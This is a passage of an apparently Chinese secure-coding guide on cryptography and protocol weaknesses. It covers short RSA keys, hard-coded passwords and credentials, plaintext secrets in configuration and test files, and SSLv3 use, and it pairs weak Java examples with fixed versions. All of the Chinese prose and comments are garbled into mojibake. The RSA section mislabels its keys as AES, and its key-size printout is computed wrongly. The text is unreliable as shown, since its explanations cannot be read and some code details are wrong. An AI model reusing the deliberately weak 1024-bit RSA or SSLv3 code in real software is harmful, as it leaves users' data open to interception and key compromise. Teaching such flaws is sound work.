        final int GCM_IV_LENGTH = 12; // GCMæ¨èçš„IVé•¿åº¦ä¸º12å­—èŠ‚
        final int GCM_TAG_LENGTH = 128; // GCMæ¨èçš„è®¤è¯æ ‡ç­¾é•¿åº¦ä¸º128ä½

        byte[] iv = new byte[GCM_IV_LENGTH];
        new SecureRandom().nextBytes(iv);
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);

        Cipher cipher = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, gcmParameterSpec);

        String plainText = &quot;Sensitive Information&quot;;
        byte[] encryptedText = cipher.doFinal(plainText.getBytes());
        System.out.println(&quot;Encrypted securely with GCM: &quot; + java.util.Base64.getEncoder().encodeToString(encryptedText));
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å¯†é’¥å¤§å°ä¸è¶³ï¼ˆRSAï¼‰&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
RSAåŠ å¯†æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå…¶å®‰å…¨æ€§åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºå¯†é’¥çš„é•¿åº¦ã€‚è¾ƒå°çš„RSAå¯†é’¥é•¿åº¦ï¼ˆå¦‚1024ä½ï¼‰è™½ç„¶åœ¨è¿‡å»è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œä½†éšç€è®¡ç®—èƒ½åŠ›çš„æå‡ï¼Œè¿™äº›è¾ƒå°çš„å¯†é’¥ç°åœ¨æ›´å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œå¦‚åˆ†è§£å¤§æ•´æ•°çš„æ”»å‡»ã€‚å¦‚æœRSAå¯†é’¥é•¿åº¦ä¸è¶³ï¼ŒåŠ å¯†ç³»ç»Ÿå¯èƒ½é¢ä¸´å®‰å…¨é£é™©ï¼ŒåŒ…æ‹¬å¯†é’¥è¢«ç ´è§£å’Œæ•æ„Ÿæ•°æ®æ³„éœ²ã€‚ä¾‹å¦‚ï¼Œ1024ä½RSAå¯†é’¥çš„ç ´è§£å·²åœ¨ç†è®ºå’Œå®è·µä¸­è¢«è¯æ˜æ˜¯å¯è¡Œçš„ï¼Œè€Œæ›´é•¿çš„å¯†é’¥ï¼ˆå¦‚2048ä½æˆ–æ›´é«˜ï¼‰åˆ™æä¾›äº†æ›´å¼ºçš„å®‰å…¨ä¿éšœã€‚
å¦‚ä¸‹åˆ—ä»£ç ä½¿ç”¨äº†1024ä½çš„AESå¯†é’¥è¿›è¡ŒåŠ å¯†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public class WeakRsaKeyExample {
    public static KeyPair generateWeakRSAKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(&quot;RSA&quot;);
        keyPairGen.initialize(1024); // ä¸æ¨èä½¿ç”¨çš„è¾ƒçŸ­å¯†é’¥é•¿åº¦
        return keyPairGen.generateKeyPair();
    }

    public static void main(String[] args) throws Exception {
        KeyPair weakKeyPair = generateWeakRSAKeyPair();
        System.out.println(&quot;Generated weak RSA key pair with key size: &quot; + weakKeyPair.getPrivate().getEncoded().length * 8 + &quot; bits&quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨å»ºè®®çš„æœ€å°å¯†é’¥é•¿åº¦ï¼šå¯¹äºRSAåŠ å¯†ï¼Œç›®å‰æ¨èä½¿ç”¨è‡³å°‘2048ä½çš„å¯†é’¥é•¿åº¦ï¼Œå¯¹äºéœ€è¦é•¿æœŸå®‰å…¨çš„åº”ç”¨ï¼Œç”šè‡³å»ºè®®ä½¿ç”¨3072ä½æˆ–4096ä½ã€‚&lt;/li&gt;
&lt;li&gt;å®šæœŸæ›´æ–°å¯†é’¥ï¼šé™¤äº†ä½¿ç”¨è¶³å¤Ÿé•¿çš„å¯†é’¥å¤–ï¼Œå®šæœŸæ›´æ¢å¯†é’¥ä¹Ÿæ˜¯ä¿æŒåŠ å¯†å¼ºåº¦çš„é‡è¦æªæ–½ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨çš„å¯†é’¥ç”Ÿæˆæ–¹æ³•ï¼šä½¿ç”¨å¼ºéšæœºæ•°ç”Ÿæˆå™¨å’Œç»è¿‡éªŒè¯çš„åº“æ¥ç”ŸæˆRSAå¯†é’¥ï¼Œç¡®ä¿å¯†é’¥çš„éšæœºæ€§å’Œå®‰å…¨æ€§ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¦‚ä¸‹åˆ—ä»£ç ä½¿ç”¨äº†2048ä½çš„AESå¯†é’¥è¿›è¡ŒåŠ å¯†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public class StrongRsaKeyExample {
    public static KeyPair generateStrongRSAKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(&quot;RSA&quot;);
        keyPairGen.initialize(2048); // æ¨èä½¿ç”¨çš„è¾ƒé•¿å¯†é’¥é•¿åº¦
        return keyPairGen.generateKeyPair();
    }

    public static void main(String[] args) throws Exception {
        KeyPair strongKeyPair = generateStrongRSAKeyPair();
        System.out.println(&quot;Generated strong RSA key pair with key size: &quot; + strongKeyPair.getPrivate().getEncoded().length * 8 + &quot; bits&quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ç¡¬ç¼–ç çš„å¯†ç &lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
ç¡¬ç¼–ç çš„å¯†ç æ˜¯æŒ‡åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç ã€é…ç½®æ–‡ä»¶æˆ–å…¶ä»–å†…éƒ¨ç»“æ„ä¸­ç›´æ¥ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨çš„å¯†ç ã€‚è¿™ç§åšæ³•æå¤§åœ°é™ä½äº†ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå› ä¸ºä»»ä½•èƒ½å¤Ÿè®¿é—®åˆ°è¿™äº›ä¿¡æ¯çš„äººï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡æºä»£ç ç®¡ç†ç³»ç»Ÿã€æ–‡ä»¶ç³»ç»Ÿè®¿é—®æƒé™æˆ–è€…é€šè¿‡å…¶ä»–è½¯ä»¶æ¼æ´ï¼‰éƒ½èƒ½å¤Ÿè·å¾—è¿™äº›æ•æ„Ÿä¿¡æ¯ã€‚æ­¤å¤–ï¼Œç¡¬ç¼–ç çš„å¯†ç å¾ˆéš¾è¿›è¡Œæ›´æ”¹ï¼Œè¿™æ„å‘³ç€ä¸€æ—¦å¯†ç æ³„éœ²ï¼Œæ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨æ€§å°±ä¼šé•¿æœŸå—åˆ°å½±å“ã€‚è¿™ç§åšæ³•è¿åäº†å®‰å…¨æœ€ä½³å®è·µï¼Œç‰¹åˆ«æ˜¯æœ€å°æƒé™åŸåˆ™å’Œå¯†ç ç®¡ç†ç­–ç•¥ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;
ç»ä¸èƒ½å¯¹å¯†ç è¿›è¡Œç¡¬ç¼–ç ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œåº”å¯¹å¯†ç è¿›è¡Œæ¨¡ç³Šå¤„ç†ï¼Œå¹¶åœ¨å¤–éƒ¨èµ„æºæ–‡ä»¶ä¸­è¿›è¡Œç®¡ç†ã€‚åœ¨ç³»ç»Ÿä¸­çš„ä»»ä½•ä½ç½®é‡‡ç”¨æ˜æ–‡çš„å½¢å¼å­˜å‚¨å¯†ç ï¼Œä¼šé€ æˆä»»ä½•æœ‰è¶³å¤Ÿæƒé™çš„äººå‡å¯è¯»å–å’Œæ— æ„ä¸­è¯¯ç”¨å¯†ç ã€‚
é‡‡ç”¨å…¶ä»–çš„æ–¹å¼å­˜å‚¨å¯†ç ï¼Œä¾‹å¦‚å°†æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç ï¼Œå­˜å‚¨åœ¨ç¯å¢ƒå˜é‡ä¸­ã€‚è¿™æ ·ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶è¯»å–è¿™äº›å€¼ï¼Œè€Œä¸éœ€è¦åœ¨ä»£ç ä¸­ç¡¬ç¼–ç ã€‚&lt;/p&gt;
&lt;h2&gt;ç¡¬ç¼–ç çš„åŠ å¯†å¯†é’¥&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼Œç¡¬ç¼–ç åŠ å¯†å¯†é’¥æ˜¯æŒ‡å°†åŠ å¯†å¯†é’¥ç›´æ¥åµŒå…¥åˆ°æºä»£ç æˆ–é…ç½®æ–‡ä»¶ä¸­çš„åšæ³•ã€‚è¿™ç§æ–¹æ³•å®¹æ˜“å¯¼è‡´å¯†é’¥æ³„éœ²ï¼Œå› ä¸ºä»»ä½•èƒ½å¤Ÿè®¿é—®ä»£ç æˆ–é…ç½®æ–‡ä»¶çš„äººéƒ½å¯ä»¥è·å–åˆ°å¯†é’¥ã€‚æ­¤å¤–ï¼Œä¸€æ—¦å¯†é’¥æ³„éœ²ï¼Œä¿®æ”¹å¯†é’¥å°†éœ€è¦æ›´æ–°å’Œé‡æ–°éƒ¨ç½²åº”ç”¨ç¨‹åºï¼Œè¿™ä¼šå¢åŠ ç»´æŠ¤æˆæœ¬å’Œå®‰å…¨é£é™©ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¯å¢ƒå˜é‡æˆ–å¤–éƒ¨å­˜å‚¨ï¼šå°†å¯†é’¥å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡ä¸­æˆ–ä½¿ç”¨å¤–éƒ¨å®‰å…¨å­˜å‚¨ï¼ˆå¦‚å¯†é’¥ç®¡ç†æœåŠ¡ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;å¯†é’¥æ—‹è½¬å’Œç®¡ç†ï¼šå®ç°å¯†é’¥æ—‹è½¬æœºåˆ¶ï¼Œå®šæœŸæ›´æ¢å¯†é’¥ï¼Œå¹¶ç¡®ä¿æ—§å¯†é’¥å¯ä»¥å®‰å…¨åœ°é€€å½¹ã€‚&lt;/li&gt;
&lt;li&gt;åŠ å¯†é…ç½®æ–‡ä»¶ï¼šå¦‚æœå¿…é¡»åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿å­˜å¯†é’¥ï¼Œåº”ç¡®ä¿è¯¥æ–‡ä»¶è¢«åŠ å¯†ï¼Œä¸”åŠ å¯†å¯†é’¥å®‰å…¨ç®¡ç†ã€‚&lt;/li&gt;
&lt;li&gt;è®¿é—®æ§åˆ¶å’Œå®¡è®¡ï¼šå¯¹å­˜å‚¨å¯†é’¥çš„ç³»ç»Ÿå®æ–½ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶å’Œå®¡è®¡ï¼Œç¡®ä¿åªæœ‰æˆæƒç”¨æˆ·å¯ä»¥è®¿é—®å¯†é’¥ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å¯†é’¥æ´¾ç”Ÿå‡½æ•°ï¼šå¦‚æœé€‚ç”¨ï¼Œä½¿ç”¨å¯†é’¥æ´¾ç”Ÿå‡½æ•°ï¼ˆå¦‚PBKDF2ã€Argon2ï¼‰ä»å¯†ç ç”Ÿæˆå¯†é’¥ï¼Œè€Œéä½¿ç”¨ç¡¬ç¼–ç å¯†é’¥ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;ç¡¬ç¼–ç çš„APIå‡­æ®&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
ç¡¬ç¼–ç çš„APIå‡­æ®æŒ‡çš„æ˜¯åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç ä¸­ç›´æ¥ç¼–å†™APIå¯†é’¥ã€å¯†ç æˆ–å…¶ä»–è®¤è¯ä»¤ç‰Œã€‚è¿™ç§åšæ³•æå¤§åœ°é™ä½äº†å®‰å…¨æ€§ï¼Œå› ä¸ºä»»ä½•èƒ½å¤ŸæŸ¥çœ‹æºä»£ç çš„äººï¼ˆä¾‹å¦‚å¼€å‘äººå‘˜ã€æ”»å‡»è€…é€šè¿‡æºä»£ç æ³„éœ²ç­‰æ–¹å¼ï¼‰éƒ½èƒ½å¤Ÿè·å¾—è¿™äº›æ•æ„Ÿä¿¡æ¯ã€‚æ­¤å¤–ï¼Œä¸€æ—¦è¿™äº›å‡­æ®è¢«ç¡¬ç¼–ç ï¼Œæ›´æ¢å‡­æ®å˜å¾—éå¸¸å›°éš¾ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½è¢«åˆ†æ•£åœ¨å¤šä¸ªæ–‡ä»¶æˆ–ä»£ç åº“ä¸­ã€‚å¦‚æœè¿™äº›å‡­æ®è¢«æ³„éœ²ï¼Œå¯èƒ½å¯¼è‡´æœªæˆæƒè®¿é—®ã€æ•°æ®æ³„éœ²ã€è´¢åŠ¡æŸå¤±æˆ–å…¶ä»–å®‰å…¨äº‹ä»¶ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¯å¢ƒå˜é‡ï¼šå°†æ•æ„Ÿå‡­æ®å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡ä¸­ã€‚è¿™æ ·ï¼Œå‡­æ®ä¸éœ€è¦ç›´æ¥å†™åœ¨ä»£ç ä¸­ï¼Œè€Œæ˜¯å¯ä»¥åœ¨è¿è¡Œæ—¶ä»ç¯å¢ƒä¸­è¯»å–ã€‚&lt;/li&gt;
&lt;li&gt;é…ç½®æ–‡ä»¶ï¼šä½¿ç”¨é…ç½®æ–‡ä»¶å­˜å‚¨å‡­æ®ï¼Œå¹¶ç¡®ä¿è¿™äº›é…ç½®æ–‡ä»¶ä¸ä¼šè¢«åŒ…å«åœ¨ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸­ã€‚å¯¹äºç”Ÿäº§ç¯å¢ƒï¼Œåº”åŠ å¯†è¿™äº›é…ç½®æ–‡ä»¶ã€‚&lt;/li&gt;
&lt;li&gt;å¯†é’¥ç®¡ç†æœåŠ¡ï¼šåˆ©ç”¨ä¸“é—¨çš„å¯†é’¥ç®¡ç†æœåŠ¡ï¼Œå¦‚AWS Secrets Managerã€Azure Key Vaultç­‰ï¼Œæ¥å®‰å…¨åœ°å­˜å‚¨å’Œç®¡ç†æ•æ„Ÿå‡­æ®ã€‚è¿™äº›æœåŠ¡è¿˜æä¾›äº†è®¿é—®æ§åˆ¶å’Œå®¡è®¡åŠŸèƒ½ï¼Œå¯ä»¥è¿½è¸ªè°ä½•æ—¶è®¿é—®äº†å‡­æ®ã€‚&lt;/li&gt;
&lt;li&gt;æƒé™æœ€å°åŒ–ï¼šç¡®ä¿ä½¿ç”¨å‡­æ®çš„åº”ç”¨ç¨‹åºæˆ–æœåŠ¡åªæœ‰æ‰§è¡Œå…¶å¿…è¦åŠŸèƒ½æ‰€éœ€çš„æœ€å°æƒé™ã€‚&lt;/li&gt;
&lt;li&gt;å®šæœŸè½®æ¢å‡­æ®ï¼šå®šæœŸæ›´æ¢APIå¯†é’¥å’Œå¯†ç ï¼Œä»¥å‡å°‘è¢«æ³„éœ²å‡­æ®æ‰€å¸¦æ¥çš„é£é™©ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;é…ç½®æ–‡ä»¶ä¸­çš„æ˜æ–‡å¯†ç &lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
åœ¨è½¯ä»¶é…ç½®æ–‡ä»¶ä¸­ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨å¯†ç æ˜¯ä¸€ç§å¸¸è§çš„å®‰å…¨éšæ‚£ã€‚è¿™ç§åšæ³•ä¼šä½¿å¯†ç å®¹æ˜“è¢«ä»»ä½•æœ‰æƒé™è®¿é—®è¿™äº›æ–‡ä»¶çš„äººå‘˜å‘ç°ï¼ŒåŒ…æ‹¬æ¶æ„ç”¨æˆ·ã€‚è¿™ä¸ä»…è¿åäº†æ•°æ®ä¿æŠ¤çš„æœ€ä½³å®è·µï¼Œæ¯”å¦‚åŠ å¯†å­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œè€Œä¸”ä¸€æ—¦è¿™äº›é…ç½®æ–‡ä»¶è¢«æ³„éœ²ï¼Œå°±ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é£é™©ï¼Œæ¯”å¦‚æœªæˆæƒè®¿é—®å’Œæ•°æ®æ³„éœ²ã€‚æ­¤å¤–ï¼Œç”±äºé…ç½®æ–‡ä»¶é€šå¸¸éœ€è¦åœ¨å¤šä¸ªç¯å¢ƒä¸­åŒæ­¥ï¼Œè¿™è¿›ä¸€æ­¥å¢åŠ äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²çš„å¯èƒ½æ€§ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¯å¢ƒå˜é‡ï¼šä½¿ç”¨ç¯å¢ƒå˜é‡å­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å¯†ç ã€‚è¿™å…è®¸åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶è¯»å–è¿™äº›ä¿¡æ¯ï¼Œè€Œä¸å°†å…¶ç¡¬ç¼–ç åœ¨æ–‡ä»¶ä¸­ã€‚&lt;/li&gt;
&lt;li&gt;å¯†é’¥ç®¡ç†ç³»ç»Ÿï¼šä½¿ç”¨ä¸“é—¨çš„å¯†é’¥ç®¡ç†ç³»ç»Ÿæ¥å­˜å‚¨å’Œç®¡ç†æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚AWS Secrets Managerã€HashiCorp Vaultç­‰ã€‚è¿™äº›ç³»ç»Ÿä¸ºå­˜å‚¨ã€è®¿é—®å’Œç®¡ç†æ•æ„Ÿæ•°æ®æä¾›äº†é¢å¤–çš„å®‰å…¨å±‚ã€‚&lt;/li&gt;
&lt;li&gt;åŠ å¯†é…ç½®æ–‡ä»¶ï¼šå¦‚æœå¿…é¡»åœ¨é…ç½®æ–‡ä»¶ä¸­å­˜å‚¨æ•æ„Ÿä¿¡æ¯ï¼Œç¡®ä¿å¯¹è¿™äº›ä¿¡æ¯è¿›è¡ŒåŠ å¯†ã€‚åªæœ‰åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶æ‰èƒ½è§£å¯†è¿™äº›ä¿¡æ¯ã€‚&lt;/li&gt;
&lt;li&gt;é…ç½®ç®¡ç†å·¥å…·ï¼šä½¿ç”¨é…ç½®ç®¡ç†å·¥å…·ï¼Œå¦‚Spring Cloud Configã€Consulç­‰ï¼Œå®ƒä»¬æ”¯æŒä»å¤–éƒ¨æºåŠ è½½é…ç½®ä¿¡æ¯ï¼Œå¹¶ä¸”å¯ä»¥æä¾›åŠ å¯†å’Œå®‰å…¨è®¿é—®æœºåˆ¶ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;æµ‹è¯•æ–‡ä»¶ä¸­çš„æ˜æ–‡å¯†ç &lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
åœ¨æµ‹è¯•æ–‡ä»¶æˆ–ä»£ç ä¸­ç¡¬ç¼–ç æ˜æ–‡å¯†ç æ˜¯ä¸€ç§å¸¸è§çš„ä¸å®‰å…¨åšæ³•ã€‚å°½ç®¡è¿™äº›å¯†ç å¯èƒ½ä»…ç”¨äºæµ‹è¯•ç›®çš„ï¼Œä½†å°†å®ƒä»¬å­˜å‚¨ä¸ºæ˜æ–‡å¯èƒ½ä¼šå¸¦æ¥å¤šç§å®‰å…¨é£é™©ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæµ‹è¯•ä»£ç æˆ–æ•°æ®è¢«æ„å¤–åœ°åŒ…æ‹¬åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ–è€…æºä»£ç åº“è¢«æœªç»æˆæƒçš„ä¸ªäººè®¿é—®ï¼Œè¿™äº›ç¡¬ç¼–ç çš„å¯†ç å¯èƒ½ä¼šè¢«æ³„éœ²ã€‚æ­¤å¤–ï¼Œæµ‹è¯•ç¯å¢ƒå¾€å¾€ä¸å¦‚ç”Ÿäº§ç¯å¢ƒå®‰å…¨ï¼Œä½¿ç”¨æ˜æ–‡å¯†ç å¢åŠ äº†è¢«æ”»å‡»çš„å¯èƒ½æ€§ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨ç¯å¢ƒå˜é‡ï¼šåœ¨æµ‹è¯•ç¯å¢ƒä¸­ï¼Œå°†æ•æ„Ÿå‡­æ®å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œè€Œä¸æ˜¯ç›´æ¥åœ¨æµ‹è¯•è„šæœ¬æˆ–é…ç½®æ–‡ä»¶ä¸­ç¡¬ç¼–ç ã€‚&lt;/li&gt;
&lt;li&gt;åŠ å¯†é…ç½®æ–‡ä»¶ï¼šå¦‚æœå¿…é¡»åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨å¯†ç ï¼Œåº”ç¡®ä¿è¿™äº›æ–‡ä»¶è¢«é€‚å½“åŠ å¯†ï¼Œå¹¶ä¸”åŠ å¯†å¯†é’¥è¢«å®‰å…¨åœ°ç®¡ç†ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å¯†é’¥ç®¡ç†ç³»ç»Ÿï¼šåˆ©ç”¨å¦‚AWS Secrets Managerã€Azure Key Vaultç­‰å¯†é’¥ç®¡ç†æœåŠ¡æ¥å­˜å‚¨å’Œè®¿é—®æµ‹è¯•ç¯å¢ƒä¸­ä½¿ç”¨çš„å‡­æ®ã€‚&lt;/li&gt;
&lt;li&gt;æ¨¡æ‹Ÿèº«ä»½éªŒè¯ï¼šåœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œå°½é‡é¿å…åœ¨æµ‹è¯•ä¸­ä½¿ç”¨å®é™…çš„ç”¨æˆ·è´¦æˆ·å’Œå¯†ç ã€‚å¯ä»¥ä½¿ç”¨æ¨¡æ‹Ÿï¼ˆMockingï¼‰æŠ€æœ¯æ¥æ¨¡æ‹Ÿèº«ä»½éªŒè¯è¿‡ç¨‹ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;åè®®ç›¸å…³&lt;/h1&gt;
&lt;h2&gt;ä¸å®‰å…¨çš„ä¼ è¾“åè®®&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
SSL (Secure Sockets Layer) å’Œæ—©æœŸçš„ TLS (Transport Layer Security) ç‰ˆæœ¬ï¼Œå¦‚ SSLv2ã€SSLv3ã€TLSv1.0 å’Œ TLSv1.1ï¼Œå·²è¢«è¯å®åŒ…å«å¤šä¸ªå®‰å…¨æ¼æ´ï¼Œè¿™äº›æ¼æ´ä½¿å¾—è¿™äº›åè®®ä¸å†å®‰å…¨ã€‚è¿™äº›åè®®çš„ç¼ºé™·åŒ…æ‹¬è¯¸å¦‚BEASTã€POODLEã€CRIMEç­‰æ”»å‡»ï¼Œè¿™äº›æ”»å‡»èƒ½å¤Ÿè§£å¯†ä½¿ç”¨è¿™äº›åè®®åŠ å¯†çš„ä¼ è¾“æ•°æ®ã€‚å› æ­¤ï¼Œä½¿ç”¨è¿™äº›æ—§åè®®ä¼ è¾“æ•æ„Ÿæ•°æ®æå…¶å±é™©ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€ä¼šè¯åŠ«æŒå’Œå…¶ä»–å®‰å…¨å¨èƒã€‚ç°ä»£åŠ å¯†é€šä¿¡åº”è¯¥ä½¿ç”¨æ›´æ–°çš„åè®®ç‰ˆæœ¬ï¼Œå¦‚TLSv1.2æˆ–TLSv1.3ï¼Œå®ƒä»¬æä¾›äº†æ›´å¼ºçš„åŠ å¯†ç®—æ³•å’Œå¢å¼ºçš„å®‰å…¨æ€§ã€‚
ä¾‹å¦‚å¦‚ä¸‹ä»£ç ä½¿ç”¨äº†ä¸å®‰å…¨çš„SSLv3ä½œä¸ºé€šä¿¡åè®®ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class InsecureSSLExample {
    public static void main(String[] args) throws Exception {
        SSLContext context = SSLContext.getInstance(&quot;SSLv3&quot;);
        context.init(null, null, null);
        SSLSocketFactory factory = context.getSocketFactory();
        SSLSocket socket = (SSLSocket) factory.createSocket(&quot;example.com&quot;, 443);
        // ä¸å®‰å…¨çš„è¿æ¥ç¤ºä¾‹
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å‡çº§åˆ°TLSv1.2æˆ–TLSv1.3ï¼šç¡®ä¿æ‰€æœ‰åŠ å¯†é€šä¿¡ä½¿ç”¨TLSv1.2æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚è¿™äº›ç‰ˆæœ¬ä¿®å¤äº†ä¹‹å‰ç‰ˆæœ¬çš„å®‰å…¨æ¼æ´ï¼Œå¹¶æä¾›äº†æ›´å¼ºçš„å®‰å…¨ä¿è¯ã€‚&lt;/li&gt;
&lt;li&gt;é…ç½®æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ï¼šåœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯é…ç½®ä¸­ç¦ç”¨SSLv2ã€SSLv3ã€TLSv1.0å’ŒTLSv1.1ã€‚ç¡®ä¿åªæ¥å—å®‰å…¨çš„åè®®ç‰ˆæœ¬ã€‚&lt;/li&gt;
&lt;li&gt;å®šæœŸæ›´æ–°å’Œæ‰“è¡¥ä¸ï¼šå®šæœŸæ›´æ–°æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºå’Œåº“ï¼Œä»¥åŒ…æ‹¬å¯¹SSL/TLSåè®®çš„æœ€æ–°å®‰å…¨è¡¥ä¸å’Œæ”¹è¿›ã€‚&lt;/li&gt;
&lt;li&gt;åŠ å¯†ç­–ç•¥å®¡æŸ¥å’Œæ›´æ–°ï¼šå®šæœŸå®¡æŸ¥åŠ å¯†ç­–ç•¥å’Œé…ç½®ï¼Œç¡®ä¿å®ƒä»¬ç¬¦åˆæœ€æ–°çš„è¡Œä¸šæœ€ä½³å®è·µå’Œåˆè§„è¦æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨çš„å¯†ç å¥—ä»¶ï¼šé™¤äº†å‡çº§åè®®ç‰ˆæœ¬å¤–ï¼Œè¿˜åº”ä½¿ç”¨å®‰å…¨çš„å¯†ç å¥—ä»¶ï¼Œé¿å…ä½¿ç”¨å·²è¢«ç ´è§£çš„æˆ–è¢«è®¤ä¸ºæ˜¯å¼±å¯†ç å¥—ä»¶ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¾‹å¦‚å¦‚ä¸‹ä»£ç ä½¿ç”¨äº†å®‰å…¨çš„TLSv1.2ä½œä¸ºä¼ è¾“åè®®ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class SecureSSLExample {
    public static void main(String[] args) throws Exception {
        SSLContext context = SSLContext.getInstance(&quot;TLSv1.2&quot;);  // ä½¿ç”¨TLSv1.2
        context.init(null, null, null);
        SSLSocketFactory factory = context.getSocketFactory();
        SSLSocket socket = (SSLSocket) factory.createSocket(&quot;example.com&quot;, 443);
        // å®‰å…¨çš„è¿æ¥ç¤ºä¾‹
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;æœªé…ç½®å†…å®¹å®‰å…¨ç­–ç•¥CSP&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
